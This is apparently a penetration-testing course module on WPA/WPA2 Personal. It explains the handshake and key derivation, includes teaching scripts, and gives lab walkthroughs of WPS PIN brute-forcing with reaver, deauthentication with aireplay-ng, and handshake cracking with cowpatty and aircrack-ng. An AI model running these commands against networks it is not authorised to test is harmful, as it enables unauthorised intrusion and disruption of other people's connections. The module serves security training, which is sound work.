# Wi-Fi Protected Access Overview

* * *

Wi-Fi Protected Access (WPA), Wi-Fi Protected Access 2 (WPA2), and Wi-Fi Protected Access 3 (WPA3) are security certification programs developed by the Wi-Fi Alliance after the year 2000 to secure wireless networks. These standards were introduced in response to significant vulnerabilities discovered in the earlier Wired Equivalent Privacy (WEP) system.

In this module, we will specifically focus on `WPA` and `WPA2`, exploring their security features and potential vulnerabilities.

## Wi-Fi Authentication Types

The following diagram illustrates the different Wi-Fi authentication types. For this module, our primary focus will be on Wi-Fi Protected Access, specifically `WPA` and `WPA2`.

![image](https://academy.hackthebox.com/storage/modules/222/Wifi_auth_types.png)

- `WPA (Wi-Fi Protected Access)`: Introduced as an interim improvement over WEP, WPA offers better encryption through TKIP (Temporal Key Integrity Protocol), but it is still less secure than newer standards.
- `WPA2 (Wi-Fi Protected Access II)`: A significant advancement over WPA, WPA2 uses AES (Advanced Encryption Standard) for robust security. It has been the standard for many years, providing strong protection for most networks.

WPA has two modes:

- `WPA-Personal`: It uses pre-shared keys (PSK) and is designed for personal use (home use).
- `WPA-Enterprise`: It is especially designed for organizations.

Later in the module, we will delve deeper into both WPA-Personal and WPA-Enterprise, demonstrating various attack vectors to compromise each.

* * *

## WPA/WPA2 Personal (PSK)

Wi-Fi Protected Access (WPA) Personal was created to replace Wired Equivalent Privacy (WEP). WPA originally implemented the Temporal Key Integrity Protocol (TKIP), which used a dynamic per-packet key to address WEP's vulnerabilities, particularly those involving initialization vector attacks. In addition, WPA introduced Message Integrity Checks (MICs), improving security over the Cyclic Redundancy Checks (CRCs) used by WEP. WPA2 introduced support for CCMP and AES encryption modes, to provide more secure communications.

Although WPA/WPA2 Personal does not support some of the more robust security features seen in WPA/WPA2 Enterprise, it is still widely used for residential routers and in some business settings. Due to the nature of a re-used pre-shared key (Wi-Fi Password), it omits certain protections that are standard in more secure wireless environments. Some of the common methods for capturing the pre-shared key include `Handshake Capture`, `PMKID Capture`, `Wi-Fi Protected Setup`, and `Evil-Twin/Social Engineering` related attacks. With these techniques, an adversary will likely be able to retrieve the clear text version of the pre-shared key and subsequently compromise the wireless network.

* * *

## WPA/WPA2 Enterprise (MGT)

Wi-Fi Protected Access Enterprise was developed to meet the need for stronger wireless encryption standards. By utilizing 802.1X security, WPA Enterprise offers more secure communication through the Extensible Authentication Protocol (EAP). Unlike its personal counterpart, WPA/WPA2 Enterprise relies heavily on authentication methods, with one of the key differences being its use of a `RADIUS` server for authentication.

The standard employs Extensible Authentication Protocol-Transport Layer Security (EAP-TLS) to provide better encryption for client devices. WPA Enterprise offers various configuration options to accommodate different use cases, providing flexibility for network administrators. It also addresses vulnerabilities associated with pre-shared key attacks, such as dictionary and brute-force attacks, by supporting diverse authentication methods. However, misconfigurations and inherent design flaws have exposed vulnerabilities in the enterprise standard, making it susceptible to attacks such as evil-twin attacks (used to capture authentication hashes) or security-downgrading of client in order to retrieve plaintext credentials.

* * *

## Hands-On Lab Scenarios

Throughout this module, we will cover real-world attack examples with accompanying commands and output, the majority of which can be reproduced on the lab machines spawned in each section. You will be provided with the knowledge and tools needed to master the WPA/WPA2 (Personal & Enterprise) attacks. Challenge yourself to reproduce all examples shown throughout the sections and complete the questions at the end.

This module assumes a basic understanding of Wi-Fi penetration testing and common attacks using the `aircrack-ng` suite. If you need a refresher, feel free to consult the [Wi-Fi Penetration Testing Basics](https://academy.hackthebox.com/module/details/222) module.


# WPA Personal Overview

* * *

[Wi-Fi Protected Access (WPA)](https://en.wikipedia.org/wiki/Wi-Fi_Protected_Access) was introduced in 2003 as a replacement for the broken WEP encryption system and was designed to work on the same hardware. WEP used a 40-bit or 104-bit key, which, when combined with a 24-bit initialization vector (IV), resulted in an overall 64-bit or 128-bit seed. This static key system was one of WEP’s major vulnerabilities as it never changed. In contrast, the WPA protocol implemented the Temporal Key Integrity Protocol (TKIP), which dynamically generates a new 128-bit key for each packet and includes Message Integrity Checks (MIC). This prevents the types of attacks that compromised WEP by adding per-packet key mixing and other security improvements.

Additionally, WPA2 employs the Advanced Encryption Standard (AES), enhancing security through the Counter-Mode/CBC-Mac Protocol (CCMP). AES keys used in WPA2 can be 128, 192, or 256 bits long, offering stronger encryption.

The PSK in WPA2-PSK stands for `Pre-Shared Key`, which is a secret key shared between the access point and the clients. However, this key is derived from the passphrase set by the network user or administrator. If a weak passphrase is chosen, the network becomes vulnerable to dictionary attacks.

* * *

## The Connection Cycle

Let's examine the typical connection process between clients and access points, known as the `connection cycle`. We will focus on a basic WPA2 (PSK) authentication whose general connection cycle follows this sequence.

1. `Beacon Frames`
2. `Probe Request and Response`
3. `Authentication Request and Response`
4. `Association Request and Response`
5. `4-Way Handshake`
6. `Disassociation/Deauthentication`

#### 1\. Beacon Frames

Beacon frames are primarily used by the access point to communicate its presence to the client or station. They include information such as supported ciphers, authentication types, its SSID, and supported data rates among others.

#### 2\. Probe Requests and Responses

The probe request and response process exists to allow the client to discover nearby access points (APs). The client sends a probe request, which can include the specific SSID (Service Set Identifier) of the desired network or be a general broadcast to find any available networks. If the SSID is hidden, the client still sends a request with the SSID in its probe. The AP in turn sends a probe response that contains information about itself for the client.

#### 3\. Authentication Request and Response

Authentication requests are sent by the client to the access point to begin the connection process. These frames are primarily used to identify the client to the access point.

#### 4\. Association/Reassociation Requests

After sending an authentication request and undergoing the authentication process, the client sends an association request to the access point. The access point then responds with an association response to indicate whether the client is able to associate with it or not.

#### 5\. 4-Way Handshake

After the association/reassociation request, a 4-way handshake is formed between the AP and client. This process securely establishes a shared encryption key (Pairwise Transient Key) between the client and access point, by exchanging nonce values and confirming mutual authentication.

#### 6\. Disassociation/Deauthentication Frames

Disassociation and Deauthentication frames are sent by the access point to a client, and they serve to terminate the connection between them. Much like their counterparts (association and authentication frames), they play a key role in managing Wi-Fi connections. Each frame contains a reason code, explaining why the client is being disconnected from the network. In Wi-Fi penetration testing, these frames are often crafted for capturing handshakes or launching denial-of-service attacks.

Examining the raw network traffic will help us better understand this process. After successfully capturing a valid handshake, the capture file can then be opened in Wireshark for detailed analysis.

* * *

Beacon frames from the access point can be identified using the following Wireshark filter:

`(wlan.fc.type == 0) && (wlan.fc.type_subtype == 8)`

![BASICS](https://academy.hackthebox.com/storage/modules/222/001_beacon.PNG)

Probe request frames from the access point can be identified using the following Wireshark filter:

`(wlan.fc.type == 0) && (wlan.fc.type_subtype == 4)`

![BASICS](https://academy.hackthebox.com/storage/modules/222/002_probe_request.PNG)

Probe response frames from the access point can be identified using the following Wireshark filter:

`(wlan.fc.type == 0) && (wlan.fc.type_subtype == 5)`

![BASICS](https://academy.hackthebox.com/storage/modules/222/003_probe_response.PNG)

The authentication process between the client and the access point can be observed using the following Wireshark filter:

`(wlan.fc.type == 0) && (wlan.fc.type_subtype == 11)`

![BASICS](https://academy.hackthebox.com/storage/modules/222/004_authentication.PNG)

After the authentication process is complete, the station's association request can be viewed using the following Wireshark filter:

`(wlan.fc.type == 0) && (wlan.fc.type_subtype == 0)`

![BASICS](https://academy.hackthebox.com/storage/modules/222/005_association_request.PNG)

The access point's association response can be viewed using the following Wireshark filter:

`(wlan.fc.type == 0) && (wlan.fc.type_subtype == 1)`

![BASICS](https://academy.hackthebox.com/storage/modules/222/006_association_response.PNG)

The EAPOL (handshake) frames can be viewed using the following Wireshark filter:

`eapol`

![BASICS](https://academy.hackthebox.com/storage/modules/222/007_handshake.PNG)

Once the connection process is complete, the termination of the connection can be viewed by identifying which party (client or access point) initiated the disconnection. This can be done using the following Wireshark filter to capture Disassociation frames (10) or Deauthentication frames (12).

`(wlan.fc.type == 0) && (wlan.fc.type_subtype == 12) or (wlan.fc.type_subtype == 10)`

![BASICS](https://academy.hackthebox.com/storage/modules/222/008_Disassociation.PNG)

* * *

## 4-Way Handshake

When connecting to the wireless network, both the client and the wireless access point (AP) must ensure that they both have/know the correct wireless network key, while never transmitting the key across the network. Instead, a series of encrypted messages, including nonces (random numbers) and MAC addresses, is exchanged to verify the key without revealing it.

Once the key has been verified, it is used to generate several encryption keys, including the `Message Integrity Check (MIC)` key. The MIC ensures that each packet has not been tampered with during transmission, confirming the data’s integrity and authenticity.

The 4-way handshake is illustrated in the following diagram:

![image](https://academy.hackthebox.com/storage/modules/282/Personal/4-way-handshake.png)

| Message | Actions During Message |
| --- | --- |
| `Message 1` | - The access point sends the client the ANONCE value<br>- The client then begins constructing the PTK<br>- PTK = PMK + Anonce + Snonce + Access Point Mac (AA) + Station/Client Mac (SA) |
| `Message 2` | - The client sends the access point the SNONCE value and a MIC (Message Integrity Check)<br>- The access point then re-constructs the PTK to validate the message |
| `Message 3` | - The access point then contructs the GTK from the GMK<br>- The GTK is then sent to the client from the access point |
| `Message 4` | - The client then acknowledges that it has both the transient and temporal encryption keys<br>- The PTK and GTK are then both installed on the access point and client. Upon acknowledgement, normal communications ensue |

Once all of this is complete, the GTK is used to decrypt broadcast and multicast communications between the access point and the client.

Here are definitions from the 4-Way Handshake process:

| Name | Definition |
| --- | --- |
| `Anonce` | A randomly generated value from the access point. |
| `Snonce` | A randomly generated value from the client. |
| `Service Set Identifier (SSID)` | The name of the access point (e.g., HTB-Wi-Fi). |
| `Pairwise Master Key` | Derived from the Pre-Shared Key, SSID, and others. This key is typically not transmitted. |
| `Pairwise Transient Key` | Constructed by combining the PMK, Anonce, Snonce, the access point’s MAC address, and the client’s MAC address. It is used to encrypt unicast traffic. |
| `Group Master Key` | Generated by the access point to be used to seed the Group Temporal Key. |
| `Group Temporal Key` | Derived from the Group Master Key (GMK) and used to encrypt multicast and broadcast traffic. |

* * *

## Construction of the Pairwise Master Key (PMK)

The `Pairwise Master Key (PMK)` is derived from the Pre-Shared Key (PSK) and the SSID of the network. To generate the PMK, the Password-Based Key Derivation Function 2 (PBKDF2) is used, which employs HMAC-SHA1 as the hashing algorithm. The SSID serves as the salt, and the PMK is created through 4096 iterations of the PBKDF2 function.

It's important to note that the PMK is never directly transmitted between the client and the access point. Instead, it is used to derive the Pairwise Transient Key (PTK), which is responsible for securing communication. For a demonstration, let’s examine and try out the scripts seen below.

* * *

The following is a PMK Generation PoC Script based on the equation for the PMK:

`PMK = PBKDF2(HMAC-SHA, PSK, SSID, 4096, 256)`

```python
import hashlib
import os, binascii

#This script generates two novel PMKs using 4096 iterations, with a pre-defined SSID and two different PSKs.
#It then prints out both generated Pairwise Master Keys, as you can see they are different.

SSID = "HTB-WirelessWanderer"
PSK = "whatthehex"
PSKB = "supersecurepassphrase"
print("Wireless Network Name: " + SSID)
print ("--------------------------------------------")

#This is the bread and butter of the derivation. As seen, it uses HMAC-SHA1, the PSK, SSID, 4096 iterations, and 32-byte (256-bit) length.
PMK = hashlib.pbkdf2_hmac('sha1', bytes(PSK, 'utf-8'), bytes(SSID, 'utf-8'), 4096, 32)
PMKB = hashlib.pbkdf2_hmac('sha1', bytes(PSKB, 'utf-8'), bytes(SSID, 'utf-8'), 4096, 32)

#This converts the generated PMKs.
Readable_PMK = binascii.hexlify(PMK)
Readable_PMKB = binascii.hexlify(PMKB)

#Finally to see the bytes-object of our PMK :)
print ("First Pairwise Master Key:" + str(Readable_PMK) + "\n Real PSK: " + PSK)
print ("Second Pairwise Master Key: " + str(Readable_PMKB) + "\n Real PSK:" + PSKB)

```

```shell
python3 PMKPoc.py

Wireless Network Name: HTB-WirelessWanderer
--------------------------------------------
First Pairwise Master Key:b'db301029589ccacdea37b21d8d73fc6c11089089cef22d75e253542ba9be53ce'
 Real PSK: whatthehex
Second Pairwise Master Key: b'e132e302472c0bc1a4c4fcd8f32b44f24043b3b75f6b59ba0bf864ae863efb3d'
 Real PSK:supersecurepassphrase

```

* * *

## Construction of the Pairwise Transient Key (PTK)

While the Pairwise Transient Key is dependent on the generation of the PMK, other values need to be generated in order to ensure randomness for each handshake. This is why the ANONCE and SNONCE values are used, along with the access point MAC address and client MAC address. The PTK ultimately consists of five separate blocks, as seen in the table below.

`PTK = PMK + Anonce + Snonce + Access Point Mac (AA) + Station/Client Mac (SA)`

| Block | Contains |
| --- | --- |
| First block | Key Confirmation Key (KCK) |
| Second block | Key Encryption Key (KEK) |
| Third block | Temporal Key (TK) |
| Fourth block | MIC Authenticator Tx Key (MIC Tx)(Only used with TKIP) |
| Fifth block | MIC Authenticator Rx Key (MIC Rx)(Only used with TKIP) |

Each section of the PTK is described below.

1. `Key Confirmation Key`: This piece is used when the MIC is created.
2. `Key Encryption Key`: This piece is crucial as the Access Point uses it during encryption of data.
3. `Temporal Key`: This is used for unicast packets in terms of encryption and decryption.

Here is a simple PTK Generation PoC Script that produces a final output of 256-bits (32-bytes), including padding. In real transmissions, the PTK is typically 256-bits (32-bytes) in length.

```python
import hashlib
import hmac
import os, binascii
import random

#As before, first we must generate the Pairwise Master Key.

SSID = "HTB-WirelessWanderer"
PSK = "whatthehex"
print("Wireless Network Name: " + SSID)
print ("Pre-Shared Key: " + PSK)
print ("--------------------------------------------")

PMK = hashlib.pbkdf2_hmac('sha1', bytes(PSK, 'utf-8'), bytes(SSID, 'utf-8'), 4096, 32)
Readable_PMK = binascii.hexlify(PMK)
print ("Pairwise Master Key:" + str(Readable_PMK) + "\n Real PSK: " + PSK)
print ("--------------------------------------------")

#Now we need to convert the values of our MACs.
APMAC = "00:FF:FF:FF:FF:FF" #AP's MAC address
APMACS = APMAC.replace(':', '') #Remove :
APMACHEX = binascii.a2b_hex(APMACS) #Convert to hex
CLMAC = "01:FF:FF:FF:FF:FF"
CLMACS = CLMAC.replace(':', '')
CLMACHEX = binascii.a2b_hex(CLMACS)

#Now to generate our ANONCE and SNONCE values, we are assuming a min/max length of 8 for ease of use.
Anonce = random.randint(10000000,99999999)
Anonce_val = str(Anonce)
Anoncebyte_val = binascii.a2b_hex(Anonce_val)
Snonce = random.randint(10000000,99999999)
Snonce_val= str(Snonce)
Snoncebyte_val = binascii.a2b_hex(Snonce_val)

#Now to calculate the Key Data and Join the overall message
KeyData = min(APMACHEX, CLMACHEX) + max(APMACHEX, CLMACHEX) + min(Anoncebyte_val, Snoncebyte_val) + max(Anoncebyte_val, Snoncebyte_val)

#Final Calculation of Example Simple PTK
PTK = hmac.new(PMK, KeyData, hashlib.sha1).digest()
nonces = b'\x00' * (32 - len(PTK)) #nonce padding
PTKFinal = PTK + nonces

print("Access Point's MAC Address: " + APMAC + '  ' + str(APMACHEX))
print("Client's MAC Address: " + CLMAC + '   ' + str(CLMACHEX))
print("--------------------------------------------")
print("Anonce Value: " + str(Anonce) + '   ' + str(Anoncebyte_val))
print("Snonce Value: " + str(Snonce) + '   ' + str(Snoncebyte_val))
print("--------------------------------------------")
print("Calculated Key Data: " + str(KeyData))
print("--------------------------------------------")
print("Pairwise Transient Key: " + str(PTKFinal))
print(str(len(PTKFinal)) + " bytes in length")

```

```shell
python3 PTKPoc.py

Wireless Network Name: HTB-WirelessWanderer
Pre-Shared Key: whatthehex
--------------------------------------------
Pairwise Master Key:b'db301029589ccacdea37b21d8d73fc6c11089089cef22d75e253542ba9be53ce'
 Real PSK: whatthehex
--------------------------------------------
Access Point's MAC Address: 00:FF:FF:FF:FF:FF  b'\x00\xff\xff\xff\xff\xff'
Client's MAC Address: 01:FF:FF:FF:FF:FF   b'\x01\xff\xff\xff\xff\xff'
--------------------------------------------
Anonce Value: 84921328   b'\x84\x92\x13('
Snonce Value: 89777785   b'\x89ww\x85'
--------------------------------------------
Calculated Key Data: b'\x00\xff\xff\xff\xff\xff\x01\xff\xff\xff\xff\xff\x84\x92\x13(\x89ww\x85'
--------------------------------------------
Pairwise Transient Key: b'\xdf\x11\x0b\\\x81+25\x02\x97\xd1\x9c|\xf4\xf4\xc5\xcc\xac\x13*\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
32 bytes in length

```

* * *

## Additional Keys in the WPA Handshake

During the WPA handshake, several additional keys are generated as well. These include the Temporal Key, Key Confirmation Key (KCK), and Key Encryption Key (KEK).

They can be found with the following algorithms:

`TK` = `PRF(PMK, "Pairwise key expansion", Min(ANonce, SNonce) || Max(ANonce, SNonce))`

`KCK` = `PRF(TK, "Key Confirmation Key", Min(ANonce, SNonce) || Max(ANonce, SNonce))`

`KEK` = `PRF(TK, "Key Encryption Key", Max(ANonce, SNonce) || Min(ANonce, SNonce))`

These are each used for the following:

`Temporal Key`: The temporal key is used for data encryption and integrity checking during communications.

`Key Confirmation Key` \+ `Key Encryption Key`: The KCK and KEK are used to confirm and encrypt messages during the handshake.

* * *

## Offline Dictionary Attacks

In order to crack WPA handshake messages, we can either capture the `PMKID` or `MICs` in the handshake. Essentially, we take all of the known values from our capture, then use them to perform our cracking efforts. To derive the MIC, we can use the following equation:

`MIC = HMAC-SHA1(PMK, ANonce || SNonce || AP_MAC || Client_MAC || Message_Length)`

Some routers are vulnerable to the PMKID attack because they have the roaming feature enabled, which allows the attacker to retrieve the PMKID directly from the access point. We will explore this attack in a later section.

* * *

## Conclusion

In order to collect a WPA handshake, an attacker must be sniffing wireless communications between a client and an access point. Doing so allows the capture of all four messages in the handshake, which can then be used to crack the password to the network (among other uses as well, such as password validation during evil-twin attacks). An attacker can passively sniff and wait for the reconnection or refresh of the client to the access point, or the attacker can be active and de-authenticate/dissociate the client from the network to force a `handshake`. It is worth noting that de-authentication and sniffing require a wireless card with both packet injection and monitoring mode capabilities. In some cases, the access point might be vulnerable to `PMKID attack`, where an adversary can abuse it to retrieve the PMKID directly from the access point.


# Reconnaissance and Bruteforce

* * *

When tasked with testing the security of a WPA/WPA2 Personal network, the first step is to conduct reconnaissance on the target. This process allows us to gather critical information about the target’s wireless capabilities and current configuration. Armed with this knowledge, we can strategically choose the most effective attack techniques to employ.

If we identify a WPA network as our target with multiple clients connected, we can perform a deauthentication attack to force a reauthentication and capture the 4-way handshake. If the target network has no connected clients, we can check if the access point is vulnerable to a PMKID attack, which allows us to capture the PMKID directly. Additionally, if the WPA network has WPS enabled, it presents an even easier attack vector, as WPS uses an older technology with an 8-digit PIN that can be brute-forced.

* * *

We begin by enabling monitor mode on our wlan0 interface using `airmon-ng`.

## Enabling Monitor Mode

```shell
sudo airmon-ng start wlan0

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    559 NetworkManager
    798 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)

```

Once our interface is in monitor mode, we can use `airodump-ng` with the interface name (wlan0mon) to scan for available Wi-Fi networks and their associated clients.

```shell
airodump-ng wlan0mon

 CH  1 ][ Elapsed: 48 s ][ 2024-08-29 21:58 ]

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 28:B2:BD:F4:FF:F1  -47 100      471       10    0   1   54   WPA2 CCMP   PSK  HackTheBox

```

As seen from the output, the `Encryption Type (ENC)` is WPA2, indicating that it's a WPA2 network using the `CCMP` cipher. If the cipher were TKIP, the ENC would display as WPA, meaning it's using WPA1. The `AUTH` is PSK, indicating that it's a WPA/WPA2 Personal network. If it was MGT instead, it would be a WPA/WPA2 Enterprise network.

There are three primary methods to attack WPA/WPA2-Personal networks:

1. Check if WPS is enabled and brute-force the PIN.
2. Capture the 4-way handshake and perform a dictionary attack to recover the PSK.
3. Execute a PMKID attack on vulnerable access points.

In this section, we'll cover the WPS brute-force attack, with the other two attacks discussed in the upcoming sections.

* * *

## Enumerating WPS

We'll begin by checking if the access point has WPS enabled using the `--wps` option in `airodump-ng`.

```shell
airodump-ng wlan0mon -c 1 --wps

 CH  1 ][ Elapsed: 0 s ][ 2024-09-03 19:38

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS                    ESSID

 28:B2:BD:F4:FF:F1  -47 100       26        0    0   1   54   WPA2 CCMP   PSK  2.0 LAB,DISP,PBC,KPAD  HackTheBox

```

`Wash` is another great tool for scanning networks with WPS. We can employ a simple command with wash to display all networks with WPS and their respective versions.

```shell
wash -i wlan0mon

BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
--------------------------------------------------------------------------------
28:B2:BD:F4:FF:F1    1  -49  2.0  No             HackTheBox

```

We can display much more verbose output with wash using the following command.

```shell
wash -j -i wlan0mon

{"bssid" : "28:B2:BD:F4:FF:F1", "essid" : "HackTheBox", "channel" : 1, "rssi" : -49, "wps_version" : 32, "wps_state" : 2, "wps_locked" : 2, "wps_manufacturer" : " ", "wps_model_name" : " ", "wps_model_number" : " ", "wps_device_name" : " ", "wps_serial" : " ", "wps_uuid" : "1ebc17d4dd35535baf79659ba37c2406", "wps_selected_registrar" : "01", "wps_response_type" : "03", "wps_primary_device_type" : "0000000000000000", "wps_config_methods" : "210c", "dummy": 0}

```

It is important to check the `wps_locked` status from wash. If it is set to `2`, it means WPS is not in a locked state. We can additionally find out which vendor is associated with the access point with the following command. We specify the beginning of the MAC address.

```shell
grep -i "28-B2-BD" /var/lib/ieee-data/oui.txt

28-B2-BD   (hex)                Intel Corporate

```

* * *

## Bruteforcing WPS

We will use Reaver to brute-force the WPS PIN. However, due to a known bug, setting the interface to monitor mode using airmon-ng can cause Reaver to malfunction. To avoid this, we'll first stop the interface in monitor mode with airmon-ng. Then, we'll use the iw command to add a new interface named mon0 and set its type to monitor mode.

```shell
airmon-ng stop wlan0mon

PHY	    Interface	    Driver		    Chipset

phy1	wlan0mon	    rt2800usb	    Ralink Technology, Corp. RT2870/RT3070
		           (mac80211 station mode vif enabled on [phy1]wlan0)
		           (mac80211 monitor mode vif disabled for [phy1]wlan0mon)

```

```shell
iw dev wlan0 interface add mon0 type monitor
ifconfig mon0 up
iwconfig

wlan0     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on

mon0      IEEE 802.11  Mode:Monitor  Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

eth0      no wireless extensions.

lo        no wireless extensions.

```

Once our interface is in monitor mode, we can launch Reaver, specifying the BSSID of our target, the appropriate channel, and our interface in monitor mode (mon0) to begin the WPS PIN brute-force attack.

```shell
reaver -i mon0 -c 1 -b 28:B2:BD:F4:FF:F1

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <[email protected]>

[+] Waiting for beacon from 28:B2:BD:F4:FF:F1
[+] Received beacon from 28:B2:BD:F4:FF:F1
[!] Found packet with bad FCS, skipping...
[+] Associated with 28:B2:BD:F4:FF:F1 (ESSID: HackTheBox)
[+] WPS PIN: '<SNIP>'
[+] WPA PSK: '<SNIP>'
[+] AP SSID: 'HackTheBox'

```

To learn more about WPS Attacks, refer to the [Attacking Wi-Fi Protected Setup](https://academy.hackthebox.com/module/details/186) module.


# Cracking MIC (4-Way Handshake)

* * *

In this section, we will walk through the process of capturing the 4-Way Handshake, which is essential for cracking WPA/WPA2-PSK networks. First, we'll analyze the captured handshake to ensure it is complete and valid. We will then demonstrate how to crack the handshake to reveal the Pre-Shared Key (PSK), providing a comprehensive understanding of how to compromise WPA/WPA2-PSK networks. Finally, we will use the obtained PSK to connect to the Wi-Fi network, demonstrating the practical application of the cracked key.

To perform this type of offline cracking attack, we need to capture a valid 4-way handshake by sending de-authentication frames to force a client (user) to disconnect from an AP. When the client reauthenticates (usually automatically), the attacker can attempt to sniff out the WPA 4-way handshake without their knowledge. This handshake is a collection of keys exchanged during the authentication process between the client and the associated AP.

![image](https://academy.hackthebox.com/storage/modules/282/Personal/4-way-handshake-2.png)

Steps for cracking the MIC (4-Way Handshake) are shown as follows:

1. `Capturing 4-Way Handshake`
2. `Analyzing Captured Handshake`
3. `Cracking the MIC (4-Way Handshake)`

* * *

## Capturing 4-Way Handshake

We begin by enabling monitor mode on our `wlan0` interface using `airmon-ng`.

```shell
sudo airmon-ng start wlan0

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    559 NetworkManager
    798 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)

```

Once our interface is in monitor mode, we can use `airodump-ng` to scan for available Wi-Fi networks and their associated clients. Additionally, we can use the option `-w WPA` to save the output of the scan into a file.

```shell
airodump-ng wlan0mon -c 1 -w WPA

21:58:02  Created capture file "WPA-01.cap".

 CH  1 ][ Elapsed: 48 s ][ 2024-08-29 21:58 ]

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 80:2D:BF:FE:13:83  -47 100      471       10    0   1   54   WPA2 CCMP   PSK  HackTheBox

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 80:2D:BF:FE:13:83  8A:00:A9:9B:ED:1A  -29    1 - 5      0      656  EAPOL  HackTheBox

```

We can now execute a deauthentication attack on connected clients using `aireplay-ng`, forcing them to reconnect to the access point. This allows us to capture the 4-way handshake using airodump-ng.

```shell
aireplay-ng -0 5 -a 80:2D:BF:FE:13:83 -c 8A:00:A9:9B:ED:1A wlan0mon

21:58:33  Waiting for beacon frame (BSSID: 80:2D:BF:FE:13:83) on channel 1
21:58:33  Sending 64 directed DeAuth (code 7). STMAC: [8A:00:A9:9B:ED:1A] [ 0| 0 ACKs]
21:58:33  Sending 64 directed DeAuth (code 7). STMAC: [8A:00:A9:9B:ED:1A] [ 0| 0 ACKs]
21:58:34  Sending 64 directed DeAuth (code 7). STMAC: [8A:00:A9:9B:ED:1A] [ 0| 0 ACKs]
21:58:35  Sending 64 directed DeAuth (code 7). STMAC: [8A:00:A9:9B:ED:1A] [ 0| 0 ACKs]
21:58:35  Sending 64 directed DeAuth (code 7). STMAC: [8A:00:A9:9B:ED:1A] [ 0| 0 ACKs]

```

After a few seconds of performing the deauthentication attack, we should see the `WPA handshake` captured in our airodump-ng output.

```shell
airodump-ng wlan0mon -c 1 -w WPA

21:58:02  Created capture file "WPA-01.cap".

 CH  1 ][ Elapsed: 48 s ][ 2024-08-29 21:58 ][ WPA handshake: 80:2D:BF:FE:13:83

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 80:2D:BF:FE:13:83  -47 100      471       10    0   1   54   WPA2 CCMP   PSK  HackTheBox

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 80:2D:BF:FE:13:83  8A:00:A9:9B:ED:1A  -29    1 - 5      0      656  EAPOL  HackTheBox

```

* * *

## Analyzing Captured Handshake

Before attempting to crack the WPA handshake, we need to ensure that we've captured a complete and valid handshake with all four messages. Attempting to crack an incomplete handshake would be a significant waste of time and resources. We'll analyze our capture file to verify its completeness, using both automated tools and manual inspection with Wireshark.

* * *

## Verifying the Handshake with CowPatty

`CowPatty` can be used to crack WPA handshakes and verify them. There are many tools available to automatically verify a handshake, but CowPatty remains one of the best. To check the WPA handshake with CowPatty, we employ the following command, specifying check mode with `-c`, and our capture file with `-r`.

```shell
cowpatty -c -r WPA-01.cap

cowpatty 4.8 - WPA-PSK dictionary attack. <[email protected]>

Collected all necessary data to mount crack against WPA2/PSK passphrase.

```

This would be an indication of a successful handshake capture. However, if we wanted to see how many handshakes we have captured, as well as the contents of the messages, we could use Wireshark.

* * *

## Verifying the Handshake with Wireshark

Upon opening our capture file into `Wireshark`, we can provide a filter to only show `eapol` messages.

![image](https://academy.hackthebox.com/storage/modules/172/wireshark/filter/nonono.txt)

`Message 1`:

In Wireshark, we want to look for sequential EAPOL messages from message 1 to 4. Then we can analyze each message by opening the 802.1X Authentication tab. If we recall, message 1 and 3 are similar as they repeat the same nonce value.

![image](https://academy.hackthebox.com/storage/modules/172/wireshark/message1/nonono.txt)

First, we need to see the WPA Key Nonce in message 1.

`Message 2`:

![image](https://academy.hackthebox.com/storage/modules/172/wireshark/message2/snip/nonono.txt)

`Message 3`:

![image](https://academy.hackthebox.com/storage/modules/172/wireshark/message3/snip/nonono.txt)

We should see that the WPA Key nonce value is the same in message 3 as it is in message 1.

`Message 4`:

![image](https://academy.hackthebox.com/storage/modules/172/wireshark/message4/snip/nonono.txt)

For message four, we should see no key nonce value and only a MIC value.

As such, to verify the handshake in Wireshark, we can check the following:

- All four EAPOL messages exist per each handshake in sequential order
- Key nonce values are the same in message 1 and 3

* * *

## Cracking the MIC (4-Way Handshake)

There are a few different tools to crack a WPA handshake, such as John the Ripper, hashcat, cowpatty, and aircrack-ng among others.

First, let's explore how to perform this using `Cowpatty`. We specify the packet capture, the dictionary file, and also the SSID of the network.

```shell
cowpatty -r WPA-01.cap -f /opt/wordlist.txt -s HackTheBox

cowpatty 4.8 - WPA-PSK dictionary attack. <[email protected]>

Collected all necessary data to mount crack against WPA2/PSK passphrase.
Starting dictionary attack.  Please be patient.

The PSK is "<SNIP>".

18 passphrases tested in 0.06 seconds:  284.77 passphrases/second

```

We can also use `aircrack-ng` to crack the PSK from the captured WPA handshake.

```shell
aircrack-ng -w /opt/wordlist.txt -0 WPA-01.cap

Reading packets, please wait...
Opening -
Opening WPA-01.cap

   #  BSSID              ESSID                     Encryption

   1  80:2D:BF:FE:13:83  HackTheBox                WPA (1 handshake)

Choosing first network as target.

Reading packets, please wait...
Opening WPA-01.cap
Opening -
1 potential targets

                               Aircrack-ng 1.6

